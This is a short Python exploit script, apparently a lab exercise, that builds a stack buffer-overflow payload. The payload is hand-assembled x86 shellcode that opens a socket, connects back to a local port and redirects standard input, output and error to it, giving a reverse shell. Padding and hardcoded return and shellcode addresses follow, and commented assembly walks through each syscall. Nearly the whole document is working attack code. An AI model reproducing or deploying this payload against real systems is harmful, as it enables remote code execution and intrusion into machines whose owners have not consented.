
from struct import pack

from shellcode import shellcode

shellcode_add= 0xbffecb78
ret_add= 0xbffed38c


TCP="\x31\xc0\x50\xb0\x01\x50\xb0\x02\x50\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x89\xe1\x31\xd2\xcd\x80\x89\xc6\x31\xc9\xb1\x01\xc1\xe1\x18\x80\xc1\x7f\x51\x66\x68\x7a\x69\x31\xc0\xb0\x02\x66\x50\x89\xe7\x6a\x10\x57\x56\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x89\xe1\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80"#0x56


print (TCP+shellcode+"A"*(2048-0x56-23)+pack("<I",0xbffecb78)+pack("<I",0xbffed38c))



#.global _main	
#.section .text

 #_main:


   #evoke the socketcakll-->socket(1)
    
   # *args socket (2,1,0) 
   # xor %eax, %eax
   # push %eax
   # movb $1,%al
   # push %eax
   #movb $2,%al
    #push %eax 

   #eax->$102 call socketcall
   # xor %eax,%eax
   # movb $102, %al
   #ebx->1 call socket
   # xor %ebx, %ebx
   # movb $1, %bl
   #args-->ecx
   # movl %esp, %ecx
   
   # xor %edx,%edx

   # int $ 0x80
    #store the socfd into esi
    #movl %eax,%esi
    
    #connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
   
    #struct the sockaddr_in
    # shift+add to pass the IP
    #xor %ecx,%ecx
   # shl  $24, %ecx
   # add  $0x7f,%cl
    #push %ecx

    #push two bytes 
    #pushw $0x697a

    #push 2bytes into AF_family IPV4,2
   # xor %eax,%eax
   # movb $2,%al
   # push %ax
 
    #address of the socketadd_in
   # movl %esp, %edi

    #push all the arguments for connect
   # pushl $16
   # push %edi
   # push %esi
    
    #socket call
   # xor %eax,%eax
   # movb $102,%al
    #specify the number 3 -->connect()
   # xor %ebx,%ebx 
   # movb $3,%bl
    
    #the address of the argument list for connect is push into ecx
   # xor %eax,%eax
   # movb $63 ,%al
    #movl %esi,%ebx  
   # xor %ecx, %ecx

    #int $0x80
    #stedout 1
    #movb $63,%al
    #movb $1,%cl
    #int $0x80
    #Stderr 2
    #movb $63,%al
    #movb $2,%cl
    #int $0x80 

